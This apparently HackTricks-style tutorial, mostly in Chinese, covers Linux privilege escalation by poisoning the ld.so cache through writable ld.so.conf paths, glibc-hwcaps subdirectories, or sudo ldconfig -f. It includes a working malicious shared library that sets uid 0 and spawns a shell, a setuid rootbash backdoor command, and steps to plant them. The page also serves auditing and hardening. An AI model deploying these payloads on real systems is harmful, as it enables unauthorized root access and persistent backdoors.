# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

此页面专门演示如何通过 `/etc/ld.so.conf` 或 `ldconfig` poisoning **system linker cache**。有关 missing-library injection、可写的 `RPATH`/`RUNPATH`、`LD_PRELOAD` 以及其他通用的 SUID linker abuse，请参阅 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)。

## 准备环境

以下部分包含我们用于准备环境的文件代码。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 在同一目录中在你的机器上**创建**这些文件
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root privs）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

确认 _libcustom.so_ 正在从 _/usr/lib_ 被**加载**，并且你可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

攻击真实目标时，请确认 binary 所需的**确切 library 名称**、loader **当前正在解析的内容**，以及哪些已配置路径可写，同时不要修改 live cache。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
仅对**受信任**的可执行文件使用 `ldd`。某些实现或异常的 ELF interpreter 可能导致其执行攻击者控制的代码；`objdump -p ./file | grep NEEDED` 可以安全地列出直接依赖项。对于受信任的目标，使用已发现的 interpreter 调用 `--list` 可以显示实际的解析结果。<sup>[[4]](#references)</sup>

几个有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**不起作用**，因为重定向由当前 shell 执行。应改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** 二进制文件会以 **secure-execution mode** 运行：`LD_LIBRARY_PATH`
会被忽略，而 `LD_PRELOAD` 会受到限制（包含斜杠的名称会被忽略，只有位于标准目录中且设置了 setuid 标记的库才可以被预加载）。root 运行 `ldconfig` 后，`/etc/ld.so.conf` 中列出的目录可能会进入 `/etc/ld.so.cache`，因此这种错误配置仍可能影响 privileged 程序。<sup>[[1]](#references)[[2]](#references)</sup>
- 在 secure-execution mode 下，`LD_DEBUG` 同样会被忽略，除非存在 `/etc/suid-debug`；因此，应从等效的非 SUID 运行中收集其 trace，而不要期待 privileged execution 输出结果。<sup>[[1]](#references)</sup>
- 在 glibc 2.33 及更高版本中，dynamic loader 还提供
`--list-diagnostics`，当 hijack 未按预期运行时，它会输出机器可读的 loader diagnostics 和内置的 search-path 信息。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache 和 SONAME 限制

`ldconfig` 不会缓存配置目录中的所有任意文件：它会检查 ELF headers，识别名称匹配 `lib*.so*` 或 `ld-*.so*` 的文件，并要求遵循常规的 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` 链。因而，注入的 object 必须具有目标 architecture/class、完全匹配的 `DT_NEEDED` 名称（通常是其 `DT_SONAME`），以及 victim 所解析的所有 symbols/versions。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
优先使用特定于目标的 library，例如此示例。使用不完整的 object shadowing 一个常见的 SONAME，可能会破坏所有在预期的 privileged target 运行前解析该 SONAME 的进程。<sup>[[3]](#references)</sup>

## Exploit

在此场景中，假设管理员已将一个易受攻击的条目添加到
`/etc/ld.so.conf.d/` 下的某个文件中，而系统的
`/etc/ld.so.conf` 会包含该文件。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
易受攻击的文件夹是 _/home/ubuntu/lib_（我们对其具有可写访问权限）。\
**在该路径内下载并编译**以下代码：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计 **root**（或其他特权账户）稍后会执行这个存在漏洞的 binary，通常最好留下一个 **root-owned artifact**，而不是生成交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在，我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，默认缓存必须通过一次成功的特权 **`ldconfig`** 运行来重建。重启只有在本地启动过程确实会调用它时才有帮助；否则，请等待管理员操作，或在可用的情况下使用不安全的 sudo 规则。<sup>[[2]](#references)</sup>

完成后，**重新检查** `sharedvuln` 可执行文件从哪里加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所见，它是**从 `/home/ubuntu/lib` 加载的**，如果任何用户执行它，就会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 注意，在此示例中我们尚未提升权限，但通过修改执行的命令，并**等待 root 或其他特权用户执行易受攻击的二进制文件**，我们将能够提升权限。

### Modern `glibc-hwcaps` shadowing

自 glibc 2.33 起，loader 可以优先使用**每个库搜索目录**中 `glibc-hwcaps/<level>/` 下的优化库。因此，仅检查 `/home/ubuntu/lib` 是不够的：可写的兼容子目录，例如 `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`，在 `ldconfig` 为其建立索引后，可能会覆盖基础库，而其他 CPU 仍会继续使用基础对象。这还提供了一种架构选择性 hijack，在验证发生于不同 CPU 上时可能被遗漏。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
当前的 glibc hardening 指南建议避免重复的 SONAMEs、非默认搜索位置，以及 `glibc-hwcaps` 子目录中的对象。从审计角度来看，应递归地检查已配置目录及其父路径组件的所有权和可写性。<sup>[[3]](#references)</sup>

### 其他错误配置 - Same vuln

在前面的示例中，我们伪造了一个错误配置：管理员**在 `/etc/ld.so.conf.d/` 中的配置文件内设置了一个非特权目录**。\
但还有其他错误配置也可能导致相同的漏洞：如果你对已加载的**配置文件**具有**写权限**，可以在可写的 `/etc/ld.so.conf.d/` 目录中创建文件，或者可以写入 `/etc/ld.so.conf`，就可以配置并利用相同的漏洞。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**假设你拥有针对 `ldconfig` 的 sudo 权限**。\
你可以通过 `-f` 指定 `ldconfig` **要读取的配置文件**，因此，让配置文件指向由攻击者控制的目录，就可以使 `ldconfig` 将这些目录添加到缓存中。<sup>[[2]](#references)</sup>\
因此，让我们创建加载 "/tmp" 所需的文件和目录：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，正如 **previous exploit** 中所示，在 `/tmp` 内创建恶意库。\
最后，让我们加载该路径，并检查二进制文件从何处加载库：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**如你所见，拥有针对 `ldconfig` 的 sudo 权限即可利用相同的漏洞。** 在评估受限 sudo 规则时，选项的具体细节很重要：`-f` 会选择其他配置文件，但仍会重建 `/etc/ld.so.cache`；`-C` 会将 cache 重定向到其他位置；`-N` 会阻止重建 cache；而 `-X` 会阻止更新链接，但**仍会重建 cache，除非与 `-N` 一起使用**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
